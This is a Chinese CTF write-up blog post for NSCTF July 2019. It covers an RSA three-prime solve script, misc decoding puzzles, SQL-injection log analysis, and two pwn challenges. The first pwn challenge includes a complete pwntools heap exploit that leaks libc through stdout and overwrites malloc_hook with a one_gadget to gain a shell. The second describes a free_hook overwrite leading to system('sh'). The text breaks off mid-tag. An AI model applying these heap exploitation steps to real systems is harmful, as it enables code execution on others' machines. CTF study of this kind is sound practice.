href="#2、先使用fastbin-attack覆盖malloc-hook为one-gadget发现全部失效。所以采用unsorted-bin-attack在free-hook低位地址写入7fxxxxxx数据，然后利用fastbin-attack-申请堆块到0x000000000007f处，这样就可以覆盖free-hook，由于我们已经知道libc了，所以覆盖的数据为system地址，然后再字符的头部写入sh-x00，然后free掉这个chunk，就等效于执行了system-“sh”-，至于为什么不用-bin-sh-x00，因为实际操作中，-sh这三个字符串被覆盖了，导致字符串残缺无法拿到shell。"><span class="toc-number">9.2.</span> <span class="toc-text">2、先使用fastbin attack覆盖malloc_hook为one_gadget发现全部失效。所以采用unsorted bin attack在free_hook低位地址写入7fxxxxxx数据，然后利用fastbin attack 申请堆块到0x000000000007f处，这样就可以覆盖free_hook，由于我们已经知道libc了，所以覆盖的数据为system地址，然后再字符的头部写入sh\x00，然后free掉这个chunk，就等效于执行了system(“sh”)，至于为什么不用&#x2F;bin&#x2F;sh\x00，因为实际操作中，&#x2F;sh这三个字符串被覆盖了，导致字符串残缺无法拿到shell。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、因为使用了unsorted-bin-attack，所以破坏了堆块申请机制，只要申请非之前已经free的fastbin就会报错，这个问题我花了5个小时去调试，最后只需在unsorted-bin-attack之前申请然后free三种不同堆块，且保证unsorted-bin-attack过程中不会用到这些fastbin即可，在完成unsorted-bin-attack之后，只需还有能申请三个堆块，其中一块为0x68大小，且三个堆块的高位地址全部相同，就可以使用fastbin-attack覆盖free-hook"><span class="toc-number">9.3.</span> <span class="toc-text">3、因为使用了unsorted bin attack，所以破坏了堆块申请机制，只要申请非之前已经free的fastbin就会报错，这个问题我花了5个小时去调试，最后只需在unsorted bin attack之前申请然后free三种不同堆块，且保证unsorted bin attack过程中不会用到这些fastbin即可，在完成unsorted bin attack之后，只需还有能申请三个堆块，其中一块为0x68大小，且三个堆块的高位地址全部相同，就可以使用fastbin attack覆盖free_hook</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag-pl4y-with-global-buffer-0verflow"><span class="toc-number">10.</span> <span class="toc-text">flag{pl4y_with_global_buffer_0verflow}</span></a></li></ol></div></div></div><main id="content-outer"><div id="top-container" style="background-image: url(/2019/07/04/CTF-NSCTF-2019年7月/bg.png)"><div id="post-info"><div id="post-title"><div class="posttitle">CTF-NSCTF-2019年7月</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 发表于 2019-07-04<span class="post-meta__separator">|</span><i class="fa fa-history fa-fw" aria-hidden="true"></i> 更新于 2019-07-04</time><span class="post-meta__separator">|</span><span><i class="fa fa-inbox post-meta__icon fa-fw" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a></span><div class="post-meta-wordcount"><i class="fa fa-file-word-o post-meta__icon fa-fw" aria-hidden="true"></i><span>字数总计:</span><span class="word-count">1.7k</span><span class="post-meta__separator">|</span><i class="fa fa-clock-o post-meta__icon fa-fw" aria-hidden="true"></i><span>阅读时长: 8 分钟</span><div class="post-meta-pv-cv"><span class="post-meta__separator">|</span><span><i class="fa fa-eye post-meta__icon fa-fw" aria-hidden="true"> </i>阅读量:</span><span id="busuanzi_value_page_pv"></span><span class="post-meta__separator">|</span><i class="fa fa-comments-o post-meta__icon fa-fw" aria-hidden="true"></i><span>评论数:</span><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/#post-comment"><span class="gitalk-comment-count comment-count"></span></a></div></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><html><head></head><body><p>划水划到了第四名，期间学到了很多，但是队伍因时间可能无法参加线下赛了，着实可惜。</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="0x1-Rsa"><a href="#0x1-Rsa" class="headerlink" title="0x1 Rsa"></a><a href="RSA.rar">0x1 Rsa</a></h3><h3 id="在线网站http-factordb-com-分解N"><a href="#在线网站http-factordb-com-分解N" class="headerlink" title="在线网站http://factordb.com/ 分解N"></a>在线网站<a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a> 分解N</h3><h3 id="发现三个素数"><a href="#发现三个素数" class="headerlink" title="发现三个素数"></a>发现三个素数</h3><h3 id="然后查阅文档-三素数rsa算法"><a href="#然后查阅文档-三素数rsa算法" class="headerlink" title="然后查阅文档 三素数rsa算法"></a>然后查阅文档 三素数rsa算法</h3><h3 id="发现和两个素数差不多，然后上脚本，解出hex-转str"><a href="#发现和两个素数差不多，然后上脚本，解出hex-转str" class="headerlink" title="发现和两个素数差不多，然后上脚本，解出hex 转str"></a>发现和两个素数差不多，然后上脚本，解出hex 转str</h3><h3 id="脚本如下："><a href="#脚本如下：" class="headerlink" title="脚本如下："></a>脚本如下：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">from libnum import n2s,s2n</span><br><span class="line">import base64</span><br><span class="line">def gcd(a, b):   #求最大公约数</span><br><span class="line">    if a < b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    while b != 0:</span><br><span class="line">        temp = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = temp</span><br><span class="line">    return a</span><br><span class="line">def egcd(a, b):</span><br><span class="line">    if a == 0:</span><br><span class="line">        return (b, 0, 1)</span><br><span class="line">    else:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        return (g, x - (b // a) * y, y)</span><br><span class="line">def modinv(a, m):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    if g != 1:</span><br><span class="line">        raise Exception('modular inverse does not exist')</span><br><span class="line">    else:</span><br><span class="line">        return x % m</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    p=810971978554706690040814093</span><br><span class="line">    q=782758164865345954251810941</span><br><span class="line">    r=1108609086364627583447802163</span><br><span class="line">    e = 59159</span><br><span class="line">    # tmp = base64.b64decode("qzogS7X8M3ZOpkUhJJcbukaRduLyqHAPblmabaYSm9iatuulrHcEpBmil7V40N7gbsQXwYx5EBH5r5V2HRcEIOXjgfk5vpGLjPVxBLyXh2DajHPX6KvbFpQ8jNpCQbUNq8Hst00yDSO/6ri9dk6bk7+uyuN0b2K1bNG5St6sCQ4qYEA3xJbsHFvMqtvUdhMiqO7tNCUVTKZdN7iFvSJqK2IHosIf7FqO24zkHZpHi31sYU7pcgYEaGkVaKs8pjq6nbnffr4URfoexZHeQtq5UAkr95zD6WgvGcxaTDKafFntboX9GR9VUZnHePiio7nJ3msfue5rkIbISjmGCAlj+w==")</span><br><span class="line">    #  = </span><br><span class="line">    d = modinv(e, (p - 1)*(r-1)*(q-1))</span><br><span class="line">    # c=s2n(tmp)</span><br><span class="line">    c = 449590107303744450592771521828486744432324538211104865947743276969382998354463377</span><br><span class="line">    #c = 225031483444634056931067907865853799650197225351377050632290334721073031287701730297815850654473721939907812470206115171738967740183098960272963323728747481560137205796840356532306950935686580268408289864109695494835661414073083573249882362332920722000099781994315336570711188934565379141406727420346806389405536474102730682155998263607095718543239272202402139286809779368710600842078606046563228470023546348908618719147790859257980882643030144242048154566691808688844513142261099020381730517293884263384819159874220288293023868919557980548807831273449743064237407705987056818011286315950476959812697067649075359373253</span><br><span class="line">    n = p*q*r</span><br><span class="line">    m=pow(c,d,n)</span><br><span class="line">    print (hex(m))</span><br></pre></td></tr></tbody></table></figure></div>
<p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/1.png" class="lazyload"></a></p>
<h3 id="转化为ascii即为flag"><a href="#转化为ascii即为flag" class="headerlink" title="转化为ascii即为flag"></a>转化为ascii即为flag</h3><p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/2.png" class="lazyload"></a></p>
<h3 id="flag-1e257b39a25c6a7c4d66e197"><a href="#flag-1e257b39a25c6a7c4d66e197" class="headerlink" title="flag{1e257b39a25c6a7c4d66e197}"></a>flag{1e257b39a25c6a7c4d66e197}</h3><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目:"></a>题目:</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a  aa a a aa  a a  a a  a a a a a  aa   a a a a a   aa  a aa  a a a      aaaa a a   aa  a aa  a a aa  a  aa  aa a  a a  a a aaa a  aaa   aa  a  a     a  aaaa a a a a   a a a   a a aa  a a a   a  a    a a  aa a a aaa a  aa    aaaa a  aaaa a a a aa  a a aaa a a aa  a  a aa a   a a  aa a a a a  aa a    aa  aaaa a  aaaa a</span><br></pre></td></tr></tbody></table></figure></div>
<h3 id="解法"><a href="#解法" class="headerlink" title="解法:"></a>解法:</h3><h3 id="将a转为1空格转为0"><a href="#将a转为1空格转为0" class="headerlink" title="将a转为1空格转为0"></a>将a转为1空格转为0</h3><h3 id="然后直接转为十六进制"><a href="#然后直接转为十六进制" class="headerlink" title="然后直接转为十六进制"></a>然后直接转为十六进制</h3><p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/3.png" class="lazyload"></a></p>
<h3 id="然后转化为ascii，然后进行栅栏得到MFTVYYTWJYVVU3TKLJHEUWS5FNWSY2LCPA"><a href="#然后转化为ascii，然后进行栅栏得到MFTVYYTWJYVVU3TKLJHEUWS5FNWSY2LCPA" class="headerlink" title="然后转化为ascii，然后进行栅栏得到MFTVYYTWJYVVU3TKLJHEUWS5FNWSY2LCPA======"></a>然后转化为ascii，然后进行栅栏得到MFTVYYTWJYVVU3TKLJHEUWS5FNWSY2LCPA======</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">str1="MFTVYYTWJYVVU3TKLJHEUWS5FNWSY2LCPA======"</span><br><span class="line">a=base64.b32decode(str1)</span><br><span class="line">str2=""</span><br><span class="line">for i in a:</span><br><span class="line">    str2+=chr(i+5)</span><br><span class="line">print (str2)</span><br></pre></td></tr></tbody></table></figure></div>
<p>运行程序：flag{S0_so_SO_b0r1ng} </p>
<h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a><a href="Naruto.rar">0x2</a></h2><p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/4.png" class="lazyload"></a><br><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/5.png" class="lazyload"></a></p>
<h3 id="发现ascii解密后为iampass0rd"><a href="#发现ascii解密后为iampass0rd" class="headerlink" title="发现ascii解密后为iampass0rd"></a>发现ascii解密后为iampass0rd</h3><h3 id="然后使用JPHS的seek，并输入上面的密码"><a href="#然后使用JPHS的seek，并输入上面的密码" class="headerlink" title="然后使用JPHS的seek，并输入上面的密码"></a>然后使用JPHS的seek，并输入上面的密码</h3><p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/6.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/6.png" class="lazyload"></a></p>
<h3 id="输入密码后，保存文件，然后打开看到flag"><a href="#输入密码后，保存文件，然后打开看到flag" class="headerlink" title="输入密码后，保存文件，然后打开看到flag"></a>输入密码后，保存文件，然后打开看到flag</h3><p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/7.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/7.png" class="lazyload"></a></p>
<h3 id="flag-jphid-is-good"><a href="#flag-jphid-is-good" class="headerlink" title="flag{jphid_is_good}"></a>flag{jphid_is_good}</h3><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a><a href="access.rar">0x3</a></h2><h3 id="Log-analysis"><a href="#Log-analysis" class="headerlink" title="Log analysis"></a>Log analysis</h3><h3 id="将所有带-的字符的数据全部转为对应的ascii"><a href="#将所有带-的字符的数据全部转为对应的ascii" class="headerlink" title="将所有带%的字符的数据全部转为对应的ascii"></a>将所有带%的字符的数据全部转为对应的ascii</h3><h3 id="然后看到有sql注入，且flag格式为flag-xxxxxxxxxxxxxxxxx"><a href="#然后看到有sql注入，且flag格式为flag-xxxxxxxxxxxxxxxxx" class="headerlink" title="然后看到有sql注入，且flag格式为flag{xxxxxxxxxxxxxxxxx}"></a>然后看到有sql注入，且flag格式为flag{xxxxxxxxxxxxxxxxx}</h3><h3 id="搜索’-’的ascii即125，然后看到-那么就向前搜索带-的字符串，并且将-后面的数字取出来"><a href="#搜索’-’的ascii即125，然后看到-那么就向前搜索带-的字符串，并且将-后面的数字取出来" class="headerlink" title="搜索’}’的ascii即125，然后看到!=,那么就向前搜索带!=的字符串，并且将!=后面的数字取出来"></a>搜索’}’的ascii即125，然后看到!=,那么就向前搜索带!=的字符串，并且将!=后面的数字取出来</h3><h3 id="结果：49-102-108-97-103-123-51-50-56-55-102-101-51-48-48-102-50-56-101-50-52-97-101-102-97-50-100-56-54-56-56-51-56-51-50-99-57-102-125"><a href="#结果：49-102-108-97-103-123-51-50-56-55-102-101-51-48-48-102-50-56-101-50-52-97-101-102-97-50-100-56-54-56-56-51-56-51-50-99-57-102-125" class="headerlink" title="结果：49 102 108 97 103 123 51 50 56 55 102 101 51 48 48 102 50 56 101 50 52 97 101 102 97 50 100 56 54 56 56 51 56 51 50 99 57 102 125"></a>结果：49 102 108 97 103 123 51 50 56 55 102 101 51 48 48 102 50 56 101 50 52 97 101 102 97 50 100 56 54 56 56 51 56 51 50 99 57 102 125</h3><p>然后写一个转化程序</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#define _CRT_SECURE_NO_WARNINGS</span><br><span class="line">#include<iostream></iostream></span><br><span class="line">#include<stdio.h></stdio.h></span><br><span class="line">#include<stdlib.h></stdlib.h></span><br><span class="line">int main() {</span><br><span class="line">	while (1) {</span><br><span class="line">		int c;</span><br><span class="line">		scanf("%d", &c);</span><br><span class="line">		printf("%c", (char)c);</span><br><span class="line">	}</span><br><span class="line">	return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div>
<h3 id="然后输入49-102-108-97-103-123-51-50-56-55-102-101-51-48-48-102-50-56-101-50-52-97-101-102-97-50-100-56-54-56-56-51-56-51-50-99-57-102-125"><a href="#然后输入49-102-108-97-103-123-51-50-56-55-102-101-51-48-48-102-50-56-101-50-52-97-101-102-97-50-100-56-54-56-56-51-56-51-50-99-57-102-125" class="headerlink" title="然后输入49 102 108 97 103 123 51 50 56 55 102 101 51 48 48 102 50 56 101 50 52 97 101 102 97 50 100 56 54 56 56 51 56 51 50 99 57 102 125"></a>然后输入49 102 108 97 103 123 51 50 56 55 102 101 51 48 48 102 50 56 101 50 52 97 101 102 97 50 100 56 54 56 56 51 56 51 50 99 57 102 125</h3><h3 id="即可拿到flag"><a href="#即可拿到flag" class="headerlink" title="即可拿到flag"></a>即可拿到flag</h3><p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/8.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/8.png" class="lazyload"></a></p>
<h2 id="flag-3287fe300f28e24aefa2d86883832c9f"><a href="#flag-3287fe300f28e24aefa2d86883832c9f" class="headerlink" title="flag{3287fe300f28e24aefa2d86883832c9f}"></a>flag{3287fe300f28e24aefa2d86883832c9f}</h2><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="0x1-1"><a href="#0x1-1" class="headerlink" title="0x1"></a><a href="Pwn1.rar">0x1</a></h3><h3 id="发现edit输入idx时没有检查存在数组越界的情况，可以越界到标准输出流stdout，然后修改里面的数据，实现libc溢出"><a href="#发现edit输入idx时没有检查存在数组越界的情况，可以越界到标准输出流stdout，然后修改里面的数据，实现libc溢出" class="headerlink" title="发现edit输入idx时没有检查存在数组越界的情况，可以越界到标准输出流stdout，然后修改里面的数据，实现libc溢出"></a>发现edit输入idx时没有检查存在数组越界的情况，可以越界到标准输出流stdout，然后修改里面的数据，实现libc溢出</h3><h3 id="得到libc之后，通过null-by-one将unsorted-bin的pre-inuse修改掉，并配好prv-size将其free，前一个unsorted-bin被free但我们chunk-list依旧存在该bin的指针，实现一定空间的任意写，然后我们在其中间之前申请的fastbin进行fastbin-attack，申请到malloc-hook的错位位置即0x7f的前8个字节处"><a href="#得到libc之后，通过null-by-one将unsorted-bin的pre-inuse修改掉，并配好prv-size将其free，前一个unsorted-bin被free但我们chunk-list依旧存在该bin的指针，实现一定空间的任意写，然后我们在其中间之前申请的fastbin进行fastbin-attack，申请到malloc-hook的错位位置即0x7f的前8个字节处" class="headerlink" title="得到libc之后，通过null by one将unsorted bin的pre_inuse修改掉，并配好prv_size将其free，前一个unsorted bin被free但我们chunk_list依旧存在该bin的指针，实现一定空间的任意写，然后我们在其中间之前申请的fastbin进行fastbin attack，申请到malloc_hook的错位位置即0x7f的前8个字节处"></a>得到libc之后，通过null by one将unsorted bin的pre_inuse修改掉，并配好prv_size将其free，前一个unsorted bin被free但我们chunk_list依旧存在该bin的指针，实现一定空间的任意写，然后我们在其中间之前申请的fastbin进行fastbin attack，申请到malloc_hook的错位位置即0x7f的前8个字节处</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn2")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil("5.exit")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("Input the size:")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("Input the content:")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil("5.exit")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">	sh.recvuntil("Input the index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">	sh.recvuntil("5.exit")</span><br><span class="line">	sh.sendline("4")</span><br><span class="line">	sh.recvuntil("Input the index:")</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">	sh.recvuntil("Input size:")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil("Input new content:")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil("5.exit")</span><br><span class="line">	sh.sendline("3")</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./pwn2")</span><br><span class="line">		lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">		main_arena_offset = 0x3C4B20</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("libc-2.23.so")</span><br><span class="line">		main_arena_offset = 0x3C4B20</span><br><span class="line">	payload = p64(0xfbad1880)+p64(0x0)*3+'\x00'</span><br><span class="line">	edit(-16,0x28,payload)</span><br><span class="line">	sh.recvuntil(24*'\x00')</span><br><span class="line">	libc = u64(sh.recv(8))-0x3c36e0</span><br><span class="line">	log.success("libc_base -> "+hex(libc))</span><br><span class="line">	main_arena = libc + main_arena_offset</span><br><span class="line">	one_gadget = libc + 0xf1147</span><br><span class="line">	log.success("main_arena: " + hex(main_arena))</span><br><span class="line">	add(0xF8,"\x11" * 0xE8)</span><br><span class="line">	add(0x68,"\x22" * 0x58)</span><br><span class="line">	add(0x18,"\x33" * 0x8)</span><br><span class="line">	add(0xF8,"\x44" * 0xE8)</span><br><span class="line">	add(0x18,"\x55" * 0x10)</span><br><span class="line">	free(0)</span><br><span class="line">	edit(2,0x18,'\x00' * 0x10 + p64(0x190))</span><br><span class="line">	free(3)</span><br><span class="line">	payload  = "a"*0xF0 + p64(0) + p64(0x71)</span><br><span class="line">	payload += '\x66' * (0x68 - 0x8)</span><br><span class="line">	payload += p64(0) + p64(0x21)</span><br><span class="line">	payload += '\x77' * 0x18</span><br><span class="line">	add(0x270,"a"*0x100)</span><br><span class="line">	edit(0,len(payload),payload)</span><br><span class="line">	free(1)</span><br><span class="line">	payload  = "a"*0xF0 + p64(0) + p64(0x71)</span><br><span class="line">	payload += p64(main_arena - 0x1b-8) + p64(main_arena -0x1b-8)</span><br><span class="line">	edit(0,len(payload),payload)</span><br><span class="line">	add(0x60,"aaaaaaaaa")</span><br><span class="line">	add(0x60,"\x00" * 3 + p64(one_gadget))</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("39.106.184.130",8089,0)</span><br></pre></td></tr></tbody></table></figure></div>
<p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/9.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/9.png" class="lazyload"></a></p>
<h2 id="flag-play-w1th-he4p-shrink"><a href="#flag-play-w1th-he4p-shrink" class="headerlink" title="flag{play_w1th_he4p_shrink}"></a>flag{play_w1th_he4p_shrink}</h2><h2 id="0x2-1"><a href="#0x2-1" class="headerlink" title="0x2"></a><a href="pwn2.rar">0x2</a></h2><h3 id="1、ida分析看到name处存在栈溢出，可以覆盖到chunk-list的低位数据，这里我们可以利用该漏洞实现堆内局部地址随意读写，利用unsorted-bin-free的时候会存在main-arena，然后通过修改name将指针调整到该处然后show即可leak-libc"><a href="#1、ida分析看到name处存在栈溢出，可以覆盖到chunk-list的低位数据，这里我们可以利用该漏洞实现堆内局部地址随意读写，利用unsorted-bin-free的时候会存在main-arena，然后通过修改name将指针调整到该处然后show即可leak-libc" class="headerlink" title="1、ida分析看到name处存在栈溢出，可以覆盖到chunk_list的低位数据，这里我们可以利用该漏洞实现堆内局部地址随意读写，利用unsorted bin free的时候会存在main_arena，然后通过修改name将指针调整到该处然后show即可leak libc"></a>1、ida分析看到name处存在栈溢出，可以覆盖到chunk_list的低位数据，这里我们可以利用该漏洞实现堆内局部地址随意读写，利用unsorted bin free的时候会存在main_arena，然后通过修改name将指针调整到该处然后show即可leak libc</h3><h3 id="2、先使用fastbin-attack覆盖malloc-hook为one-gadget发现全部失效。所以采用unsorted-bin-attack在free-hook低位地址写入7fxxxxxx数据，然后利用fastbin-attack-申请堆块到0x000000000007f处，这样就可以覆盖free-hook，由于我们已经知道libc了，所以覆盖的数据为system地址，然后再字符的头部写入sh-x00，然后free掉这个chunk，就等效于执行了system-“sh”-，至于为什么不用-bin-sh-x00，因为实际操作中，-sh这三个字符串被覆盖了，导致字符串残缺无法拿到shell。"><a href="#2、先使用fastbin-attack覆盖malloc-hook为one-gadget发现全部失效。所以采用unsorted-bin-attack在free-hook低位地址写入7fxxxxxx数据，然后利用fastbin-attack-申请堆块到0x000000000007f处，这样就可以覆盖free-hook，由于我们已经知道libc了，所以覆盖的数据为system地址，然后再字符的头部写入sh-x00，然后free掉这个chunk，就等效于执行了system-“sh”-，至于为什么不用-bin-sh-x00，因为实际操作中，-sh这三个字符串被覆盖了，导致字符串残缺无法拿到shell。" class="headerlink" title="2、先使用fastbin attack覆盖malloc_hook为one_gadget发现全部失效。所以采用unsorted bin attack在free_hook低位地址写入7fxxxxxx数据，然后利用fastbin attack 申请堆块到0x000000000007f处，这样就可以覆盖free_hook，由于我们已经知道libc了，所以覆盖的数据为system地址，然后再字符的头部写入sh\x00，然后free掉这个chunk，就等效于执行了system(“sh”)，至于为什么不用/bin/sh\x00，因为实际操作中，/sh这三个字符串被覆盖了，导致字符串残缺无法拿到shell。"></a>2、先使用fastbin attack覆盖malloc_hook为one_gadget发现全部失效。所以采用unsorted bin attack在free_hook低位地址写入7fxxxxxx数据，然后利用fastbin attack 申请堆块到0x000000000007f处，这样就可以覆盖free_hook，由于我们已经知道libc了，所以覆盖的数据为system地址，然后再字符的头部写入sh\x00，然后free掉这个chunk，就等效于执行了system(“sh”)，至于为什么不用/bin/sh\x00，因为实际操作中，/sh这三个字符串被覆盖了，导致字符串残缺无法拿到shell。</h3><h3 id="3、因为使用了unsorted-bin-attack，所以破坏了堆块申请机制，只要申请非之前已经free的fastbin就会报错，这个问题我花了5个小时去调试，最后只需在unsorted-bin-attack之前申请然后free三种不同堆块，且保证unsorted-bin-attack过程中不会用到这些fastbin即可，在完成unsorted-bin-attack之后，只需还有能申请三个堆块，其中一块为0x68大小，且三个堆块的高位地址全部相同，就可以使用fastbin-attack覆盖free-hook"><a 